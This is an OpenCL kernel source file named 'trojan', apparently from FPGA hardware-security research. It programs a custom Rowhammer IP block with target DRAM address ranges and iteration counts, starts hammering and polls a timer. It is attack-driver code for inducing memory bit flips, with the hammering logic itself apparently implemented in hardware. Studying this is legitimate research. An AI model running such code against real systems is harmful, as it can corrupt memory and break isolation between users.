#//--/* AUTHOR:SUMANTA CHAUHDURI */
#include "../onboard/host/inc/defines.h"
#define DDR_WINDOW_BASE 0x00000000
#define TIMER  0x20
#define ACP_BASE 0x80000000
#define PAGE_SIZE 0x1000
#define TOTAL_MEM 0x7000000
#define ADDR_SPAN_EXT_CONTROL 0x00000000




__kernel void trojan(	global volatile unsigned short * restrict timings, //timings will never go past 16 bits
			global volatile unsigned int * restrict test,
			const unsigned int range_low,
			const unsigned int range_high,
			const unsigned int pagesize,
			const unsigned int inner_iter, 	
			const unsigned int cache_user_mask)
{
	volatile int total,i,offset,index;
	int adr=0;
	offset=0x40000000-(int)test;
	__local int readvalue[2048];
	volatile int start,stop;
		
		for(adr=range_low;adr<range_high;adr=adr+pagesize) {
			test[(offset+0x10)/4]=adr; //TEXT START
			test[(offset+0x14)/4]=4*inner_iter; //TEXT END (nombres de hammer)*4
			test[(offset+0x18)/4]=0x0; //timer
			test[(offset+0x4)/4]=0x1; //START
		for(i=0;i<10*inner_iter;i++) {  //very strange in siganl tap i see only 1/10th of reads (taht'as why this hack)
			mem_fence(CLK_LOCAL_MEM_FENCE);
			mem_fence(CLK_GLOBAL_MEM_FENCE);
			//each row 2K (A0-A9, 2 bytes) so neigbouring bank at 8*2K. 
			readvalue[3]=test[(offset+0x18)/4];
			if(test[(offset+0x18)/4]> 25600000) break;
			mem_fence(CLK_LOCAL_MEM_FENCE);
			mem_fence(CLK_GLOBAL_MEM_FENCE);

		}
		}
}
/*
ROWHAMMER IP Registsers:
0x0  :
0x4  :  START HAMMERING
0x8	 :
0xC  :
0x10 :  HAMMER ADDR START
0x14 :  HAMMER ADDR END
0x18 :  TIMER
*/
